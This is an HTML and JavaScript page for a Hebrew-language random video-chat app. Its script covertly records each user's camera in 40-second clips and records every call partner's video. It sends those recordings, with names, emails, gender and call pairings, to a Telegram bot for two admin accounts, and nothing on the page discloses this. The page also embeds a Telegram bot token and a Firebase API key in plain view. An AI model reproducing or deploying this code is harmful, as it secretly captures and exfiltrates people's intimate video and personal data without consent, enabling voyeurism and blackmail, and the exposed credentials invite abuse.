<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>VideoApp Pro - Ultimate UI</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-storage-compat.js"></script>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: system-ui, sans-serif; background: #000; height: 100vh; display: flex; flex-direction: column; color: white; overflow: hidden; }
        
        /* שורת כפתורים עליונה */
        .header { position: absolute; top: 15px; width: 100%; display: flex; justify-content: space-between; padding: 0 15px; z-index: 2000; pointer-events: none; gap: 10px; }
        .header-right { display: flex; gap: 10px; }
        .btn-circle { background: rgba(0,0,0,0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); color: white; width: 45px; height: 45px; border-radius: 50%; cursor: pointer; pointer-events: auto; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        .btn-red { background: rgba(231, 76, 60, 0.8); }

        /* חלוקת 50/50 */
        .v-box { flex: 1; position: relative; overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center; border-bottom: 2px solid #333; }
        video { width: 100%; height: 100%; object-fit: cover; }
        
        .status-msg { position: absolute; z-index: 100; font-weight: bold; text-align: center; width: 100%; text-shadow: 0 2px 5px #000; font-size: 18px; pointer-events: none; }

        /* הרשמה */
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; align-items: center; justify-content: center; }
        .modal-content { background: #fff; color: #333; width: 85%; max-width: 380px; padding: 30px; border-radius: 20px; }
        .modal-content input, .modal-content select { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; font-size: 16px; }
        .reg-btn { width: 100%; height: 50px; background: #27ae60; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>

<div class="header">
    <button id="btn-report" class="btn-circle btn-red" style="display:none;" onclick="confirmReport()">🚩</button>
    <div class="header-right">
        <button id="btn-mute" class="btn-circle" onclick="toggleMute()">🎤</button>
        <button class="btn-circle" onclick="switchCamera()">🔄</button>
    </div>
</div>

<div id="swipe-zone" style="flex:1; display:flex; flex-direction:column;">
    <div class="v-box">
        <div id="msg-idle" class="status-msg">⬅️ החלק שמאלה לחיפוש</div>
        <div id="msg-search" class="status-msg" style="display:none; color:#3498db;">מחפש שותף...</div>
        <video id="remoteVideo" autoplay playsinline></video>
    </div>
    
    <div class="v-box">
        <video id="localVideo" autoplay muted playsinline></video>
    </div>
</div>

<div id="regModal" class="modal">
    <div class="modal-content">
        <h2 style="text-align:center; margin-bottom:10px;">ברוכים הבאים</h2>
        <input type="text" id="reg-name" placeholder="שם מלא">
        <input type="email" id="reg-email" placeholder="אימייל">
        <select id="reg-gender">
            <option value="זכר">זכר</option>
            <option value="נקבה">נקבה</option>
        </select>
        <button class="reg-btn" onclick="handleRegistration()">היכנס</button>
    </div>
</div>

<script>
    const TG_TOKEN = "8696076063:AAG5wEFTgFnJje39FQEHIbV8hPWxBf_IEac";
    const ADMIN_IDS = ["8373785890", "7089165458"];
    const SERVER_URL = "https://video-app-ylx4.onrender.com"; 
    
    const firebaseConfig = { apiKey: "AIzaSyB_ld3VrntNgM3Pgc4jyZL2hKzUMSp-o10", storageBucket: "live-video-20fca.firebasestorage.app" };
    firebase.initializeApp(firebaseConfig);
    
    const socket = io(SERVER_URL);
    const peer = new Peer(undefined, { config: {'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }]} });

    let myStream, myPeerId, currentCall, isSearching = false, camFacing = "user";
    let userRecorder, localInterval, remoteRecorder, partnerData = null, isMuted = false;

    window.onload = () => {
        const saved = localStorage.getItem('user_v16');
        if (!saved) document.getElementById('regModal').style.display = 'flex';
        else initCamera();
    };

    async function handleRegistration() {
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const gender = document.getElementById('reg-gender').value;
        if(!name || !email) return alert("חובה למלא פרטים");
        
        const user = { name, email, gender };
        localStorage.setItem('user_v16', JSON.stringify(user));
        document.getElementById('regModal').style.display = 'none';
        
        // התראת הרשמה למנהלים
        const text = `🎉 **משתמש חדש נרשם!**\n\n👤 שם: ${name}\n📧 אימייל: ${email}\n🚻 מגדר: ${gender}`;
        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`));
        
        initCamera();
    }

    async function initCamera() {
        if (myStream) myStream.getTracks().forEach(t => t.stop());
        try {
            myStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: camFacing, width: { ideal: 640 } }, 
                audio: true 
            });
            document.getElementById('localVideo').srcObject = myStream;
            
            if (isMuted) myStream.getAudioTracks().forEach(t => t.enabled = false);

            if (currentCall && currentCall.peerConnection) {
                const videoTrack = myStream.getVideoTracks()[0];
                const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
                if (sender) sender.replaceTrack(videoTrack);
            }
            startLocalRecording();
        } catch (e) { console.error("Camera Error", e); }
    }

    function toggleMute() {
        isMuted = !isMuted;
        if (myStream) myStream.getAudioTracks().forEach(t => t.enabled = !isMuted);
        const btn = document.getElementById('btn-mute');
        btn.innerText = isMuted ? "🔇" : "🎤";
        btn.style.background = isMuted ? "rgba(231, 76, 60, 0.8)" : "rgba(0,0,0,0.5)";
    }

    async function switchCamera() {
        camFacing = (camFacing === "user" ? "environment" : "user");
        await initCamera();
    }

    // הקלטת עצמית - תומך בהחלפת מצלמה
    function startLocalRecording() {
        if (userRecorder && userRecorder.state !== "inactive") userRecorder.stop();
        if (localInterval) clearInterval(localInterval);

        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
        if (MediaRecorder.isTypeSupported('video/mp4')) options = { mimeType: 'video/mp4' };

        try { userRecorder = new MediaRecorder(myStream, options); } 
        catch(e) { userRecorder = new MediaRecorder(myStream); }

        userRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const mime = userRecorder.mimeType;
                const ext = mime.includes('mp4') ? 'mp4' : 'webm';
                const blob = new Blob([e.data], { type: mime });
                const user = JSON.parse(localStorage.getItem('user_v16'));
                
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id);
                    fd.append("video", blob, `local_${Date.now()}.${ext}`);
                    fd.append("caption", `🎥 המצלמה של: ${user.name} (${user.email})`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
            }
        };
        userRecorder.start();
        localInterval = setInterval(() => {
            if(userRecorder.state === "recording") { userRecorder.stop(); userRecorder.start(); }
        }, 40000);
    }

    // הקלטת השיחה השלמה (מצלמת השותף)
    function startRemoteRecording(remoteStream) {
        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
        
        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
        if (MediaRecorder.isTypeSupported('video/mp4')) options = { mimeType: 'video/mp4' };

        try { remoteRecorder = new MediaRecorder(remoteStream, options); } 
        catch(e) { remoteRecorder = new MediaRecorder(remoteStream); }

        remoteRecorder.ondataavailable = async (e) => {
            if (e.data.size > 0) {
                const mime = remoteRecorder.mimeType;
                const ext = mime.includes('mp4') ? 'mp4' : 'webm';
                const blob = new Blob([e.data], { type: mime });
                const user = JSON.parse(localStorage.getItem('user_v16'));
                const pName = partnerData ? partnerData.name : "לא ידוע";
                
                ADMIN_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append("chat_id", id);
                    fd.append("video", blob, `call_${Date.now()}.${ext}`);
                    fd.append("caption", `📞 שיחה שלמה:\n${user.name} דיבר עם ${pName}`);
                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendVideo`, { method: "POST", body: fd });
                });
            }
        };
        remoteRecorder.start();
    }

    peer.on('open', id => myPeerId = id);

    function startSearching() {
        if (isSearching) return;
        isSearching = true;
        stopEverything();
        document.getElementById('msg-idle').style.display = "none";
        document.getElementById('msg-search').style.display = "block";
        const user = JSON.parse(localStorage.getItem('user_v16'));
        socket.emit('find-partner', { peerId: myPeerId, name: user.name, email: user.email });
    }

    // כשאתה היוזם של השיחה
    socket.on('partner-found', data => {
        partnerData = data; 
        notifyAdminNewCall(partnerData);
        isSearching = false;
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('btn-report').style.display = "flex";
        
        const user = JSON.parse(localStorage.getItem('user_v16'));
        // העברת הפרטים שלך לשותף דרך החיבור עצמו
        currentCall = peer.call(data.peerId, myStream, { metadata: user });
        handleCall(currentCall);
    });

    // כשמישהו מתקשר אליך
    peer.on('call', call => {
        // קבלת פרטי השותף מה-Metadata
        partnerData = call.metadata;
        if(partnerData) notifyAdminNewCall(partnerData);
        
        call.answer(myStream);
        currentCall = call;
        document.getElementById('btn-report').style.display = "flex";
        handleCall(call);
    });

    function notifyAdminNewCall(partner) {
        const user = JSON.parse(localStorage.getItem('user_v16'));
        const text = `🤝 **שיחה חדשה**\n1: ${user.name} (${user.email})\n2: ${partner.name} (${partner.email})`;
        ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
    }

    function handleCall(call) {
        call.on('stream', s => { 
            const rv = document.getElementById('remoteVideo');
            rv.srcObject = s;
            rv.onloadedmetadata = () => rv.play().catch(e => console.log(e)); // מונע מסך שחור
            startRemoteRecording(s); // מתחיל להקליט את השותף
        });
    }

    socket.on('partner-disconnected', () => stopEverything());

    function confirmReport() {
        if (confirm("האם לדווח ולנתק?")) {
            const user = JSON.parse(localStorage.getItem('user_v16'));
            const pName = partnerData ? partnerData.name : "לא ידוע";
            const pEmail = partnerData ? partnerData.email : "לא ידוע";
            
            const text = `🚨 **דיווח התקבל**\nמאת: ${user.name} (${user.email})\nעל: ${pName} (${pEmail})`;
            ADMIN_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`));
            
            socket.emit('report-user');
            stopEverything();
        }
    }

    function stopEverything() {
        isSearching = false; 
        if (remoteRecorder && remoteRecorder.state !== "inactive") remoteRecorder.stop();
        partnerData = null;
        socket.emit('leave-chat');
        if (currentCall) { currentCall.close(); currentCall = null; }
        document.getElementById('msg-idle').style.display = "block";
        document.getElementById('msg-search').style.display = "none";
        document.getElementById('btn-report').style.display = "none";
        document.getElementById('remoteVideo').srcObject = null;
    }

    let sX = 0;
    document.getElementById('swipe-zone').addEventListener('touchstart', e => sX = e.touches[0].clientX);
    document.getElementById('swipe-zone').addEventListener('touchend', e => {
        const diff = sX - e.changedTouches[0].clientX;
        if (diff > 80) startSearching(); 
        else if (diff < -80) stopEverything();
    });
</script>
</body>
</html>
